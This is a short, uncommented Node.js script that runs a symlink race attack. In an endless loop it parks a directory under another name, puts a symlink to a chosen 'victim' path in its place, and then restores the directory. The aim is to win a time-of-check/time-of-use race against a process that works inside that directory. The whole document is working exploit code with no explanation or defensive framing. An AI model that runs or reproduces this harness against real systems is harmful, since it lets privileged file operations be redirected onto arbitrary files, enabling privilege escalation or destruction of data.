const fs = require("node:fs")
const [dir, victim] = process.argv.slice(2)
const parked = `${dir}.parked`
for (;;) {
  try {
    fs.renameSync(dir, parked)
    fs.symlinkSync(victim, dir)
    fs.unlinkSync(dir)
    fs.renameSync(parked, dir)
  } catch {
    try { if (fs.existsSync(parked) && !fs.existsSync(dir)) fs.renameSync(parked, dir) } catch {}
  }
}
